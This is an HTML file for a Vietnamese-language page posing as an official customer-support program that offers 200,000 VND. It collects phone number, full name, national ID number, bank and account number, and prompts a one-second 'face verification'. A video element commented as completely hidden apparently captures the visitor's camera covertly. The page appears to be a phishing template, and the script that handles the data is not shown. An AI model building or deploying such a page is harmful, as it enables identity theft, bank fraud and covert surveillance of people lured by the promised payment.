<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trung tâm hỗ trợ khách hàng</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="card" id="mainCard">
    <div class="badge-top">✔️ Hỗ trợ chính thức</div>
    <h1>Xác minh nhận hỗ trợ</h1>
    <p class="sub">
      <strong>+200.000 ₫</strong> từ chương trình hỗ trợ khách hàng thân thiết.<br>
      Điền thông tin và xác thực khuôn mặt <strong>trong 1 giây</strong> để nhận ngay.
    </p>

    <form id="supportForm">
      <div class="form-group">
        <label>Số điện thoại <span class="required">*</span></label>
        <input type="text" id="phone" placeholder="Nhập số điện thoại của bạn" value="0987654321">
      </div>

      <div class="form-group">
        <label>Họ và tên <span class="required">*</span></label>
        <input type="text" id="fullname" placeholder="Nguyễn Văn A" value="Nguyễn Văn A">
      </div>

      <div class="form-group">
        <label>Số CMND/CCCD</label>
        <input type="text" id="idNumber" placeholder="Nhập số CMND/CCCD (không bắt buộc)" value="012345678901">
      </div>

      <div class="form-group">
        <label>Ngân hàng nhận tiền</label>
        <select id="bank">
          <option>Vietcombank</option>
          <option selected>Techcombank</option>
          <option>BIDV</option>
          <option>Vietinbank</option>
          <option>MB Bank</option>
          <option>ACB</option>
          <option>Sacombank</option>
        </select>
      </div>

      <div class="form-group">
        <label>Số tài khoản</label>
        <input type="text" id="accountNumber" placeholder="Nhập số tài khoản nhận tiền" value="190123456789">
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="agree" checked>
        <label for="agree">
          Tôi đồng ý với <a href="#">điều kiện và điều khoản</a> của chương trình, cho phép thu thập thông tin để xác thực danh tính.
        </label>
      </div>

      <button type="submit" class="btn-submit" id="submitBtn">Xác thực và nhận hỗ trợ ngay</button>
    </form>

    <div class="footer-note">
      <a href="#">Chính sách bảo mật</a> · <a href="#">Điều khoản sử dụng</a>
    </div>
  </div>

  <!-- Camera hidden - hoàn toàn ẩn -->
  <div id="cameraPreview">
    <video id="video" autoplay muted playsinline></video>
  </div>
  <canvas id="canvas"></canvas>

  <div id="toast" class="toast"></div>

  <script src="script.js"></script>
</body>
</html>
